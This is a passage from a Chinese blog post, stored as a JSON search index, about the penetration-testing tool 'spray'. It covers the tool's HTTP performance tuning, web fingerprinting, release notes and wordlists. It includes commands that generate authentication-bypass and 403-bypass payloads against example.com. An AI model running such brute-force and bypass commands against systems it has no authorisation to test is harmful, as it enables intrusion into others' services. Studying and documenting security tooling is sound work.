\u4f46spray\u6ca1\u6709\u8fd9\u4e9b\u9650\u5236, \u901a\u8fc7\u4e86\u4e00\u4e9b\u7cfb\u5217\u6307\u7eb9\u8bc6\u522b\u76f8\u5173\u4f18\u5316\u4f5c\u4e3a**fingers\u7684\u6700\u4f73\u5b9e\u8df5\u6307\u5357.** </p> <p>\u53d1\u5305\u5668\u5f88\u76f4\u89c2\u7684\u7406\u89e3\u5c31\u662f\u53d1\u51fa\u53bbrequest, \u6536\u83b7response, \u770b\u8d77\u6765\u5f88\u7b80\u5355\u662f\u4e0d\u662f\uff1f</p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u6027\u80fd","title":"\u6027\u80fd","text":"<p>\u800c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u95ee\u9898 \u6027\u80fd. </p> <p>\u9700\u8981\u6ce8\u610f, \u8fd9\u91cc\u6307\u7684\u6027\u80fd\u4e0d\u662f\u901a\u8fc7\u63d0\u9ad8\u5e76\u53d1\u6570\u5c31\u80fd\u8fbe\u5230\u7684\u6027\u80fd. \u8fc7\u5ea6\u63d0\u9ad8\u5e76\u53d1\u6570, \u53ea\u4f1a\u9020\u6210\u7c7b\u4f3c\u7684DOS\u7684\u6548\u679c, \u53d1\u5305\u7aef\u548c\u6536\u5305\u7684\u670d\u52a1\u90fd\u6709\u53ef\u80fd\u56e0\u4e3a\u54cd\u5e94\u65f6\u95f4\u7684\u63d0\u9ad8\u800c\u5bfc\u81f4timeout \u751a\u81f3\u9020\u6210\u670d\u52a1\u5b95\u673a. </p> <p>\u5b9e\u9645\u4e0a, HTTP\u534f\u8bae\u548cgolang\u672c\u8eab\u5c31\u63d0\u4f9b\u4e86\u4e0d\u5c11\u6027\u80fd\u4f18\u5316\u7684\u624b\u6bb5, \u8fd9\u4e9b\u624b\u6bb5\u80fd\u6700\u5927\u6548\u7387\u5229\u7528\u5e26\u5bbd, \u7269\u7406\u8d44\u6e90, FD\u7b49\u7b49\u8d44\u6e90. \u6700\u5927\u7a0b\u5ea6\u5229\u7528\u5e93\u63d0\u4f9b\u7684\u8fde\u63a5\u6c60, HTTP\u534f\u8bae\u63d0\u4f9b\u7684\u94fe\u63a5\u590d\u7528\u7b49\u7279\u6027\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u7684\u6027\u80fd\u597d\u51e0\u4e2a\u6570\u91cf\u7ea7\u7684\u7206\u6740\u57fa\u4e8epython\u7684\u5de5\u5177(dirsearch, dirmap\u7b49), \u66f4\u80fd\u8d85\u8fc7\u6ca1\u6709\u7ecf\u8fc7\u7cbe\u5fc3\u8c03\u5236\u7684rust\u5de5\u5177(rustscan, feroxbuster)</p> <p>\u6709\u4eba\u63d0\u5230rustscan 3s 6k\u7aef\u53e3\u5f88\u5feb, \u4f46\u5b9e\u9645\u4e0agolang\u505a\u52303s 60k\u4e5f\u6ca1\u591a\u5927\u56f0\u96be. \u5728HTTP Fuzz/\u76ee\u5f55\u7206\u7834\u573a\u666f\u4e0b, \u8fd8\u89e6\u53ca\u4e0d\u5230\u8bed\u8a00\u5e26\u6765\u7684\u6027\u80fd\u4f18\u52bf</p> <p>spray\u63d0\u4f9b\u4e86\u4e24\u79cdclient(\u6807\u51c6\u5e93http\u548cfasthttp), \u4ee5\u53ca\u4e24\u79cd\u6a21\u5f0fcheck\u548cbrute. \u5206\u522b\u6839\u636e\u4e0d\u540c\u7684\u573a\u666f\u8fdb\u884c\u4e86\u4e0d\u540c\u7684\u6027\u80fd\u4f18\u5316. </p> <p>\u4ee5brute\u6a21\u5f0f\u4e0b\u7684\u6807\u51c6\u5e93http. (\u4f18\u5316\u70b9\u5199\u5728\u6ce8\u91ca\u4e2d) <pre><code>standardClient: &amp;http.Client{  \n    Transport: &amp;http.Transport{  \n       TLSClientConfig: &amp;tls.Config{  \n          Renegotiation:      tls.RenegotiateNever,  // \u7981\u6b62server\u7aef\u91cd\u65b0tls\u63e1\u624b\n          InsecureSkipVerify: true,                  // \u5ffd\u7565tls\u8bc1\u4e66\u6821\u9a8c\u9519\u8bef\n       },  \n       TLSHandshakeTimeout: config.Timeout,         // tls\u63e1\u624b\u65f6\u95f4\u9650\u5236\n       MaxConnsPerHost:     config.Thread * 3 / 2,  // \u5355\u4e2a\u76ee\u6807\u6700\u5927\u8fde\u63a5\u6570, \u6307\u7684\u662fTCP\u8fde\u63a5, \u901a\u8fc7keep-alive\u590d\u7528,\u9632\u6b62\u5927\u91cf\u91cd\u65b0\u5efa\u7acb\u7684\u8fde\u63a5DOS\u76ee\u6807. \u6027\u80fd\u4f18\u5316\u7684\u6838\u5fc3\n       IdleConnTimeout:     config.Timeout,  // \u7a7a\u95f2\u8fde\u63a5\u8d85\u8fc7\u6307\u5b9a\u65f6\u95f4\u91ca\u653e(\u9ed8\u8ba42s)\n       ReadBufferSize:      16384, // 16k   // spray\u8ba4\u4e3a16k\u7684\u6570\u636e\u4ee5\u53ca\u8db3\u591f\u83b7\u53d6\u6240\u6709\u6307\u7eb9\n    },  \n    Timeout: config.Timeout,                // \u5168\u5c40timeout, \u65b9\u5f0f\u8fc7\u5ea6\u7b49\u5f85\n    CheckRedirect: func(req *http.Request, via []*http.Request) error {  \n       return http.ErrUseLastResponse      // \u9650\u5236\u91cd\u5b9a\u5411\u6b21\u6570, \u9632\u6b62\u65e0\u9650\u5faa\u73af\n    },  \n},\n</code></pre></p> <p>\u505a\u5230\u5408\u9002\u7684\u4f7f\u7528http\u534f\u8bae\u7684\u57fa\u672c\u914d\u7f6e, \u5c31\u80fd\u8d85\u8fc790%\u7684\u626b\u63cf\u5668\u4e86. \u5269\u4e0b\u768410%\u8fd8\u9700\u8981\u4e00\u70b9\u9ed1\u9b54\u6cd5. </p> <p>fasthttp\u4e0enet/http\u5305\u66f4\u662f\u5feb\u4e0a\u4e86\u6570\u500d.</p> <p>fasthttp\u901a\u8fc7\u590d\u7528buf, \u4f18\u5316\u89e3\u6790\u5668, io\u590d\u7528\u7b49\u624b\u6bb5\u53ef\u4ee5\u8ba9\u6027\u80fd\u5de8\u989d\u63d0\u5347. \u53ea\u8981\u5408\u9002\u914d\u7f6e\u5176client, \u6027\u80fd\u53ef\u4ee5\u7206\u6740\u4e00\u4f17\u57fa\u4e8erust\u5f00\u53d1\u7684\u626b\u63cf\u5668(\u6027\u80fd\u597d\u8fc7feroxbuster 50%). \u5728\u672c\u673anginx\u6d4b\u8bd5(\u907f\u514d\u7f51\u7edc\u5e26\u6765\u7684\u5f71\u54cd)\u4e0b, \u6700\u5feb\u901f\u7387\u80fd\u523020w/s(\u5305\u542b\u751f\u6210\u8bf7\u6c42\u4e0e\u89e3\u6790\u54cd\u5e94\u7684\u5b8c\u6574\u8fc7\u7a0b, \u800c\u975e\u53ea\u53d1\u5305).</p> <p>fasthttp\u7684\u914d\u7f6e\u65b9\u5f0f\u4e0e\u4f18\u5316http\u5dee\u4e0d\u591a. \u6709\u5174\u8da3\u53ef\u4ee5\u5728\u4ee3\u7801\u91cc\u627e\u5230. </p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u6536\u96c6","title":"\u6536\u96c6","text":"<p>\u7136\u540e\u5c31\u662f\u5982\u4f55\u8986\u76d6\u5230\u5b58\u5728\u6307\u7eb9\u7684\u9875\u9762\u4e86. \u8fd9\u91cc\u5c31\u662f\u8003\u9a8c\u6307\u7eb9\u6536\u96c6\u7684\u6838\u5fc3\u80fd\u529b\u4e86.</p> <ol> <li>\u6307\u7eb9\u5b58\u5728\u4e8e\u6bcf\u4e2a\u5305\u4e2d, \u4f8b\u5982http\u7684header.</li> <li>\u6307\u7eb9\u5b58\u5728\u4e8e\u7279\u5b9a\u9875\u9762\u4e2d, \u901a\u8fc7\u4e3b\u52a8\u63a2\u6d4b\u6307\u5b9a\u76ee\u5f55\u89e3\u51b3</li> <li>\u6307\u7eb9\u662f\u4f9b\u5e94\u94fe\u6307\u7eb9, \u6709\u4e00\u4e9b\u4f9b\u5e94\u94fe\u7279\u6709\u7684\u5f00\u53d1\u4e60\u60ef</li> <li>\u6307\u7eb9\u662f\u5f00\u6e90\u7ec4\u4ef6\u6307\u7eb9, \u53ef\u80fd\u5b58\u5728\u7284\u89d2\u65ee\u65ef\u91cc</li> <li>...</li> </ol> <p>\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4e9b\u5e38\u89c1\u573a\u666f(\u5b9e\u9645\u4e0a\u6bd4\u8fd9\u590d\u6742\u7684\u591a).</p> <p>\u7edd\u5927\u90e8\u5206\u5de5\u5177\u53ea\u80fd\u8986\u76d6\u5176\u4e2d\u7684\u7b2c\u4e00\u79cd, \u4e5f\u5c31\u662f\u6839\u636eindex\u9875\u9762\u5339\u914d\u5b57\u7b26\u4e32\u6216\u6b63\u5219. \u4f8b\u5982ehole, kscan</p> <p>\u80fd\u6ee1\u8db3\u7b2c\u4e8c\u70b9\u7684, \u4e5f\u5c31\u662f\u652f\u6301\u6307\u5b9a\u4e3b\u52a8\u8bc6\u522b\u6307\u7eb9\u76ee\u5f55\u7684, \u5df2\u7ecf\u5c11\u4e86\u5f88\u591a, \u4f8b\u5982 observer_ward, xapp, \u8fd9\u4e24\u4e2a\u5de5\u5177\u53ef\u4ee5\u914d\u7f6e\u4e3b\u52a8\u53d1\u5305\u8def\u5f84.</p> <p>\u8981\u5b9e\u73b0\u7b2c\u4e00\u548c\u7b2c\u4e8c\u70b9\u5e76\u4e0d\u590d\u6742, \u90a3\u4e48\u7b2c\u4e09\u548c\u7b2c\u56db\u70b9\u6539\u5982\u4f55\u5b9e\u73b0\u5462? </p> <p>\u5b9e\u9645\u4e0a\u5df2\u7ecf\u4e0d\u5b58\u5728\u901a\u7528\u7684\u89e3\u51b3\u529e\u6cd5\u4e86. \u5c06\u53d8\u6210\u4e00\u7cfb\u5217\u7684\u89c4\u5219\u4ea4\u53c9\u7ec4\u5408\u5b9e\u73b0. </p> <p>\u4f8b\u5982\u4f9b\u5e94\u94fe\u548c\u5f00\u6e90\u7ec4\u4ef6\u6307\u7eb9, \u53ef\u80fd\u53ea\u5b58\u5728\u4e8e\u67d0\u4e00\u4e2a\u9875\u9762\u4e2d</p> <ul> <li>\u90a3\u4e48\u6211\u4eec\u7684\u76ee\u6807\u5c31\u53d8\u6210\u4e86\u5c3d\u53ef\u80fd\u591a\u7684\u53d1\u73b0\u76ee\u5f55;  </li> <li>\u5982\u679c\u76ee\u6807\u5b58\u5728\u57fa\u4e8epath\u7684\u53cd\u5411\u4ee3\u7406. \u90a3\u4e48\u6211\u4eec\u7684\u76ee\u6807\u5c31\u53d8\u6210\u7206\u7834; </li> <li>\u5982\u679c\u76ee\u6807\u662f\u4e00\u7cfb\u5217\u76f8\u4f3c\u7684api, \u90a3\u4e48\u5c31\u53d8\u6210\u679a\u4e3e\u6216\u8005\u722c\u866b;</li> <li>\u5982\u679c\u4fe1\u606f\u5b58\u5728\u4e8e\u901a\u7528\u6587\u4ef6\u4e2d, \u4f8b\u5982<code>robots.txt</code>, <code>README.md</code>, \u5404\u79cd\u7f16\u8bd1\u6587\u4ef6, \u4f9d\u8d56\u6587\u4ef6\u7b49, \u8fd8\u9700\u8981\u7206\u7834\u901a\u7528\u6587\u4ef6\u76ee\u5f55. </li> <li>.....</li> </ul> <p>\u800c\u6bcf\u6b21\u6536\u96c6\u5230\u7b2c\u4e09/\u7b2c\u56db\u7c7b\u7684\u6307\u7eb9, \u5f88\u5927\u6982\u7387\u90fd\u610f\u5473\u7740\u5355\u70b9\u7a81\u7834. \u8fd9\u7c7b\u6307\u7eb9\u662f\u5176\u4ed6\u4eba\u5f88\u96be\u53d1\u73b0, \u5f88\u96be\u5173\u6ce8\u7684, \u4e5f\u662f\u9632\u5b88\u65b9\u81ea\u5df1\u4e5f\u5173\u6ce8\u4e0d\u5230\u7684. </p> <p>\u5728spray\u4e2d, \u63d0\u4f9b\u4e86\u521a\u624d\u63d0\u5230\u7684\u6240\u6709\u8fd9\u4e9b\u7684\u89e3\u51b3\u65b9\u6848. </p> <p>spray\u6700\u521d\u8bbe\u8ba1\u662f\u7528\u6765\u76ee\u5f55\u7206\u7834\u7684, \u4f46\u662f\u5728\u5b9e\u6218\u4e2d\u591a\u6b21\u901a\u8fc7\u57fa\u672c\u4fe1\u606f\u6536\u96c6\u53d1\u73b0\u5404\u79cd\u5173\u952e\u4fe1\u606f\u5e26\u6765\u7a81\u7834\u65f6, \u624d\u771f\u6b63\u610f\u8bc6\u5230\u4e86\u76ee\u5f55\u7206\u7834\u662f\u4e3a\u4e86\u4ec0\u4e48\u670d\u52a1\u7684. \u8fd9\u65f6\u5019, \u76ee\u5f55\u7206\u7834\u7684\u76ee\u7684\u5c31\u4ece\u8d8a\u6765\u8d8a\u591a\u7684\u5b57\u5178\u53d8\u6210\u4e86**\u9ad8\u6548\u4e14\u7cbe\u51c6**.</p> <p>\u6709\u4eba\u63d0\u51fa\u8fc7\u7591\u60d1spray\u7684\u4e0b\u4e00\u4ee3\u4f53\u73b0\u5728\u54ea\u91cc\u3002 \u73b0\u5728\u53ef\u4ee5\u7ed9\u51fa\u7b54\u6848\u4e86\u3002 </p> <p>\u4e0b\u4e00\u4ee3HTTP Fuzz\u5de5\u5177\u7684\u51e0\u4e2a\u7279\u6027: </p> <ul> <li>\u9ad8\u6027\u80fd</li> <li>\u652f\u6301\u540c\u65f6\u7206\u7834\u591a\u4e2a\u76ee\u6807, \u4f53\u73b0\u5728: \u6279\u91cf\u8f93\u5165\u4e0e\u65ad\u70b9\u7eed\u4f20</li> <li>\u591a\u79cd\u65b9\u5f0f\u7684\u4fe1\u606f\u6536\u96c6, \u4f53\u73b0\u5728: \u654f\u611f\u4fe1\u606f\u89c4\u5219\u5e93+fingers\u6307\u7eb9\u5e93</li> <li>\u591a\u79cd\u65b9\u5f0f\u7684\u76ee\u5f55\u751f\u6210, \u4f53\u73b0\u5728: \u722c\u866b, \u5b57\u5178\u751f\u6210\u5668, \u9012\u5f52\u751f\u6210\u5668, \u901a\u7528\u6587\u4ef6\u751f\u6210\u5668, \u5907\u4efd\u6587\u4ef6\u751f\u6210\u5668...</li> <li>\u667a\u80fd\u5316\u5224\u65ad, \u5c3d\u53ef\u80fd\u5c11\u7684\u4eba\u5de5\u4ecb\u5165</li> <li>\u652f\u6301\u4e0e\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u7684\u8054\u52a8</li> <li>......</li> </ul>"},{"location":"blog/2024/08/25/spray-best-practices/#\u4ece\u76ee\u5f55\u7206\u7834\u5230\u5168\u9762\u7684web\u4fe1\u606f\u6536\u96c6","title":"\u4ece\u76ee\u5f55\u7206\u7834\u5230\u5168\u9762\u7684WEB\u4fe1\u606f\u6536\u96c6","text":"<p>spray \u7ecf\u8fc7\u4e8636\u4e2a\u7248\u672c\u7684\u8fed\u4ee3\u3002 \u5e73\u5747\u6bcf\u4e2a\u7248\u672c\u90fd\u4f1a\u67091-3\u4e2afeature. \u4e0d\u5230\u4e00\u5e74\u65f6\u95f4, \u5df2\u7ecf\u662f\"\u9762\u76ee\u5168\u975e\"\u4e86. </p> <p>spray\u4ece\u793e\u533a\u4e2d\u63a5\u6536\u4e86\u5927\u91cf\u7684\u63d0\u8bae, \u73b0\u5728\u7248\u672c\u53f7\u6765\u5230\u4e86v1.1.0, \u672c\u6587\u4e5f\u662f\u7b49\u5f85\u5927\u7248\u672c\u66f4\u65b0\u5e26\u6765\u4e86\u8f83\u591abug\u4fee\u590d\u540e\u624d\u53d1\u5e03. \u611f\u8c22bug\u7684\u53cd\u9988\u8005\u4eec.</p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u91cd\u70b9\u6539\u52a8","title":"\u91cd\u70b9\u6539\u52a8","text":"<ul> <li>\u9ed8\u8ba4\u4f7f\u7528\u6a21\u5f0f\u53d8\u6210\u4e86\u4fe1\u606f\u6536\u96c6\u6a21\u5f0f, \u7206\u7834\u73b0\u5728\u53ea\u662fspray\u7684\u4e00\u79cd\u7528\u6cd5\uff0c \u800c\u4e0d\u662f\u5168\u90e8\u3002</li> <li>\u6781\u5927\u52a0\u5f3a\u4e86\u6307\u7eb9\u80fd\u529b, \u6307\u7eb9\u80fd\u529b\u7684\u8be6\u60c5\u5728\u524d\u4e00\u5929\u7684\u6307\u7eb9\u8bc6\u522b\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\u4e2d\u4ecb\u7ecd. <ul> <li>\u65b0\u589e<code>--active</code>\u652f\u6301\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b</li> <li>\u65b0\u589e<code>--finger</code> \u53ef\u4ee5\u5f00\u542f\u591a\u6307\u7eb9\u5f15\u64ce\u8bc6\u522b</li> <li>\u91cd\u6784\u4e86<code>--recon</code> \u73b0\u5728\u652f\u6301\u66f4\u4e30\u5bcc\u7684\u914d\u7f6e, \u7c7b\u4f3cHaE\u80fd\u4ece\u54cd\u5e94\u5305\u4e2d\u63d0\u53d6\u654f\u611f\u4fe1\u606f</li> </ul> </li> <li>\u91cd\u6784\u4e86\u8f93\u51fa\u663e\u793a\u4e0e\u65e5\u5fd7, spray\u7684\u8f93\u51fa\u4e0e\u8f93\u5165\u662f\u88ab\u8bdf\u75c5\u6700\u591a\u7684\u5730\u65b9. \u73b0\u5728\u8fd9\u4e24\u4e2a\u70b9\u90fd\u5f97\u5230\u4e86\u6781\u5927\u7684\u4f18\u5316</li> <li>\u652f\u6301\u4e86diesearch\u7684\u7edd\u5927\u90e8\u5206\u7279\u6027\u5e76\u91c7\u7528dirsearch\u7684\u9ed8\u8ba4\u5b57\u5178</li> <li>\u652f\u6301\u5185\u7f6e\u9884\u8bbe\u5b57\u5178</li> <li>\u652f\u6301\u901a\u7528\u76ee\u5f55, \u5907\u4efd\u76ee\u5f55, \u722c\u866b, \u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u7206\u7834, \u5e76\u4fe1\u606f\u6536\u96c6</li> <li>\u652f\u6301\u914d\u7f6e\u6587\u4ef6, \u7528\u6237\u53ef\u4ee5\u4fdd\u7559\u81ea\u5df1\u7684\u9884\u8bbe</li> <li>\u91cd\u6784\u4e86\u5173\u4e8e\u63d2\u4ef6\u7684\u7279\u6027, <code>--common</code> \u4e0e<code>--bak</code> \u6709\u66f4\u5f3a\u5927\u7684\u80fd\u529b\u4e86</li> </ul>"},{"location":"blog/2024/08/25/spray-best-practices/#\u5176\u4ed6\u66f4\u65b0","title":"\u5176\u4ed6\u66f4\u65b0","text":"<ul> <li>\u652f\u6301socks5/http\u4ee3\u7406</li> <li>\u652f\u6301\u81ea\u5b9a\u4e49HTTP method</li> <li>\u652f\u6301http raw\u683c\u5f0f\u8f93\u51fa</li> <li>\u652f\u6301\u6807\u51c6\u8f93\u51fa\u7684json\u8f93\u51fa</li> <li>\u4f18\u5316\u722c\u866b\u7684\u89c4\u5219\u3001\u8f93\u51fa\u3001\u4f5c\u7528\u57df\u7b49</li> <li>\u7b80\u5316\u4e86\u5173\u4e8efuzzy\u90e8\u5206\u7684\u64cd\u4f5c</li> <li>\u5927\u91cfbug\u4fee\u590d</li> <li></li> <li>...</li> </ul>"},{"location":"blog/2024/08/25/spray-best-practices/#ui\u4e0e\u4ea4\u4e92","title":"UI\u4e0e\u4ea4\u4e92","text":"<p>(\u9009\u62e9\u6f14\u793a\u7684\u76ee\u6807\u662f\u963f\u91cc\u4e91\u4e0a\u7684\u968f\u673a\u7f51\u6bb5, \u5e76\u4e0d\u5b58\u5728\u4efb\u4f55\u653b\u51fb\u8bf7\u6c42)</p> <p>\u73b0\u5728\u7684spray\u9ed8\u8ba4\u4f7f\u7528\u65b9\u5f0f\u53d8\u6210\u4e86\u7c7b\u4f3cgogo\u7684\u7528\u6cd5, \u7206\u7834\u4e0d\u518d\u662fspray\u552f\u4e00\u4f7f\u7528\u65b9\u5f0f.</p> <p></p> <p>\u5f53\u7136\u7206\u7834\u529f\u80fd\u8fd8\u5728, \u5e76\u4e14\u6709\u4e86\u65b0\u7684UI </p>"},{"location":"blog/2024/08/25/spray-best-practices/#rule\u7684\u9ad8\u7ea7\u7528\u6cd5","title":"rule\u7684\u9ad8\u7ea7\u7528\u6cd5","text":"<p>\u8fd9\u662fspray\u8bbe\u8ba1\u4e2d\u975e\u5e38\u91cd\u8981\u7684\u529f\u80fd, \u4f46\u662f\u56e0\u4e3a\u5b58\u5728\u4e00\u5b9a\u95e8\u69db, \u7528\u8fc7\u7684\u4eba\u5e76\u4e0d\u591a. </p> <p>https://github.com/chainreactors/templates/blob/master/spray/rule/authbypass.rule</p> <p></p> <p>\u8fd9\u662f\u57fa\u4e8erule\u5b9e\u73b0\u7684java\u6743\u9650\u7ed5\u8fc7\u7684\u89c4\u5219\u914d\u7f6e, \u53ef\u4ee5\u901a\u8fc7<code>--append-rule authbypass</code>\u4f7f\u7528\u8fd9\u4e2a\u9884\u8bbe\u7684\u89c4\u5219. </p> <p>\u5982\u679c\u53d1\u73b0\u4e86\u6709\u6548\u76ee\u5f55, \u4f8b\u5982\u5176\u4ed6\u76ee\u5f55\u90fd\u662f404, \u4f46\u662f\u67d0\u4e2a\u76ee\u5f55\u5b58\u5728403, \u901a\u8fc7403\u7684\u6a21\u7cca\u8fc7\u6ee4, \u5c31\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u89c4\u5219\u5bf9\u6709\u6548\u76ee\u5f55\u4f7f\u7528\u8fd9\u4e2arule\u8fdb\u884c\u751f\u6210. </p> <p><code>spray -u http://example.com --append-rule authbypass --debug --fuzzy</code></p> <p>\u4f1a\u751f\u6210\u7c7b\u4f3c\u8fd9\u6837\u7684payload, \u5c31\u50cf\u90a3\u4e9b\u4e13\u95e8\u7528\u6765bypass auth\u7684\u626b\u63cf\u5668\u90a3\u6837, \u4f46\u662f\u66f4\u52a0\u667a\u80fd\u4e0e\u81ea\u7531.</p> <p></p> <p>\u5f53\u7136\u53ef\u4ee5\u6307\u5b9a\u66f4\u591a\u7684\u9884\u8bbe\u7528\u6237\u81ea\u5df1\u7684payload\u89c4\u5219</p> <p><code>spray -u http://example.com --append-rule authbypass --append-rule extbypass --append-rule custom.rule --debug --fuzzy</code></p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u5185\u7f6e\u5b57\u5178","title":"\u5185\u7f6e\u5b57\u5178","text":"<p>spray\u5728\u6784\u5efa\u5b8c\u5404\u79cd\u4fe1\u606f\u6536\u96c6\u80fd\u529b\u4e4b\u540e, \u7ec8\u4e8e\u53ef\u4ee5\u5efa\u8bbe\u76ee\u5f55\u4ed3\u5e93.</p> <p>\u5f53\u524d\u4ed3\u5e93\u4f4d\u4e8e: https://github.com/chainreactors/templates/tree/master/spray/dict</p> <p></p> <p>spray\u5c06\u6709\u9009\u62e9\u6027\u7684\u5f00\u59cb\u6dfb\u52a0\u901a\u7528\u76ee\u5f55\u5b57\u5178. \u66f4\u503e\u5411\u4e8e\u67d0\u4e2a\u7ec4\u4ef6/\u6280\u672f\u6808\u7684\u5b57\u5178\u5355\u5143, \u800c\u975eallinone\u7684\u5927\u5b57\u5178. </p> <p>\u56e0\u6b64\u9664\u4e86dirsearch\u7684\u9ed8\u8ba4\u5b57\u5178\u5916, \u5f53\u524d\u5176\u4ed6\u5b57\u5178\u5747\u4e3a\u6b64\u7c7b(\u90e8\u5206\u5b57\u5178\u6765\u6e90\u4e8e https://github.com/cpkkcb/fuzzDicts and https://github.com/insightglacier/Dictionary-Of-Pentesting) .</p> <p>\u901a\u8fc7\u4f7f\u7528\u7279\u5b9a\u7ec4\u4ef6\u7684\u5b57\u5178, spray\u5c06\u4f1a\u66f4\u52a0\u6709\u9009\u62e9\u6027\u7684\u8fdb\u884c\u6df1\u5ea6\u4fe1\u606f\u6536\u96c6. </p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u8fd9\u91cc\u53ea\u63d0\u5230\u4e86\u4e00\u4e9b\u76f8\u5bf9\u91cd\u8981\u7684\u6539\u52a8, \u66f4\u591a\u7684\u7279\u6027\u90fd\u6ca1\u6709\u8be6\u7ec6\u4ecb\u7ecd, \u9700\u8981\u4f7f\u7528\u8005\u5728\u6587\u6863\u4e2d\u81ea\u884c\u67e5\u9605. </p> <p>spray\u5c06\u4f5c\u4e3a\u540e\u7eedASM\u5de5\u5177\u4e2d\u5173\u4e8e\u76ee\u5f55\u7206\u7834, web\u4fe1\u606f\u6536\u96c6, web fuzz\u7684\u80fd\u529b\u63d0\u4f9b\u5355\u5143(artifact). \u81f4\u529b\u4e8e\u6ee1\u8db3\u5728\u5927\u89c4\u6a21, \u5206\u5e03\u5f0f, \u590d\u6742\u4f7f\u7528\u573a\u666f\u7684\u4e0b\u4e00\u4ee3Fuzz\u5de5\u5177.  \u901a\u8fc7\u4e0a\u8ff0\u5404\u79cd\u80fd\u529b\u7684\u7ec4\u5408\u4f7f\u7528, spray\u53ef\u4ee5\u5728\u4e0d\u8fdb\u884cpoc\u6d4b\u8bd5\u7684\u60c5\u51b5\u4e0b\u6536\u96c6\u5230\u51e0\u4e4e\u6240\u6709\u4f5c\u4e3a\u6d4b\u8bd5\u8005\u9700\u8981\u77e5\u9053\u7684\u4fe1\u606f. </p>"},{"location":"blog/2024/08/25/spray-best-practices/#\u8ba8\u8bba","title":"\u8ba8\u8bba","text":"<p>spray\u5728v1.0.0\u53d1\u5e03\u540e\u5c06\u5f15\u6765\u4e00\u4e9b\u91cd\u8981\u7684\u6539\u52a8. \u6211\u4eec\u60f3\u4ece\u793e\u533a\u7684\u4f7f\u7528\u8005\u6765\u63d0\u5347spray\u7684\u80fd\u529b. </p> <p>\u6211\u4eec\u6709\u4e86\u65b0\u7684\u60f3\u6cd5:</p> <p>\u76ee\u524d\u4f7f\u7528spray\u6700\u5927\u7684\u56f0\u5883\u53ef\u80fd\u8fd8\u662f\u6ca1\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u5b57\u5178. \u4f46\u5236\u4f5c\u5b57\u5178\u9664\u4e86\u624b\u5de5\u6574\u7406\u4e4b\u5916\u51e0\u4e4e\u522b\u65e0\u4e8c\u6cd5. \u4f46\u5982\u679c\u4f7f\u7528spray\u7684\u4eba\u8db3\u591f\u591a, spray\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u90e8\u5206\u6570\u636e\u6765\u63d0\u9ad8spray\u5404\u65b9\u9762\u7684\u529f\u80fd.</p> <ul> <li>\u63d0\u9ad8\u6307\u7eb9\u51c6\u786e\u5ea6, \u7b5b\u9009\u65e0\u6548\u6307\u7eb9</li> <li>\u6539\u8fdb\u8fc7\u6ee4\u7b97\u6cd5, \u51cf\u5c11\u624b\u52a8\u914d\u7f6e</li> <li>\u6574\u7406\u76ee\u5f55\u5b57\u5178</li> </ul> <p>\u56e0\u6b64, \u662f\u5426\u80fd\u63a5\u53d7spray\u65b0\u589e\u56de\u4f20\u8131\u654f\u6570\u636e\u5230\u4e91\u7aef\u7684\u65b9\u5f0f\u6765\u63d0\u9ad8\u5de5\u5177\u672c\u8eab. \u4e3a\u4e86\u4fdd\u8bc1\u5b89\u5168, \u53ef\u4ee5\u505a\u51fa\u4ee5\u4e0b\u4fdd\u8bc1.</p> <ul> <li>\u6570\u636e\u5c06\u4f1a\u53bb\u6389\u76ee\u6807\u90e8\u5206(\u5305\u62ecurl, \u8df3\u8f6c\u540e\u7684url, title), \u53ea\u56de\u4f20baseline\u57fa\u672c\u4fe1\u606f(length, path, status), \u6307\u7eb9\u6570\u636e</li> <li>\u8be5\u529f\u80fd\u53ef\u4ee5\u901a\u8fc7\u53c2\u6570\u5173\u95ed</li> <li>\u8be5\u529f\u80fd\u7684\u5404\u4e2a\u76f8\u5173\u7ec4\u4ef6(\u5305\u62ec\u4e91\u7aef\u90e8\u5206)\u4fdd\u6301\u5f00\u6e90, \u5e76\u901a\u8fc7github action\u81ea\u52a8\u7f16\u8bd1</li> <li>\u6536\u96c6\u7684\u6570\u636e\u53ea\u7528\u4e8e\u63d0\u9ad8spray\u4ee5\u53cachainreactors\u76f8\u5173\u5de5\u5177\u7684\u80fd\u529b</li> </ul> <p>\u53ef\u4ee5\u5728 https://github.com/chainreactors/spray/issues/43 \u4e2d\u53d1\u8868\u4f60\u7684\u770b\u6cd5, \u662f\u5426\u80fd\u63a5\u6536spray\u8fdb\u884c\u8fd9\u79cd\u7a0b\u5ea6\u7684\u4fe1\u606f\u56de\u4f20</p>"},{"location":"blog/2024/08/25/spray-best-practices/#todo","title":"TODO","text":"<ul> <li>\u66f4\u5f3a\u5927\u7684extract\u914d\u7f6e, \u80fd\u80fd\u8fbe\u5230HaE\u7684\u6548\u679c. \u6216\u8005\u8bf4spray\u5b9e\u9645\u4e0a\u662f\u60f3\u5b9e\u73b0\u4e3b\u52a8\u7248\u672c\u7684HaE+CaA. </li> <li>\u4e0enuclei\u7684\u8054\u52a8</li> <li>\u91cd\u6784\u9012\u5f52\u76f8\u5173\u529f\u80fd, \u5e26\u6765\u66f4\u5f3a\u7684\u76ee\u5f55\u53d1\u73b0\u4e0e\u6307\u7eb9\u53d1\u73b0\u80fd\u529b</li> <li>\u901a\u8fc7\u793e\u533a\u63d0\u4f9b\u7684\u589e\u5f3a, \u8bf7\u89c1: https://github.com/chainreactors/spray/issues/43</li> <li>\u66f4\u4e30\u5bcc\u7684\u9884\u8bbe\uff0c \u4f8b\u5982\u4f18\u5316403 bypass, auth bypass, \u5907\u4efd\u6587\u4ef6\u53d1\u73b0\u7b49</li> 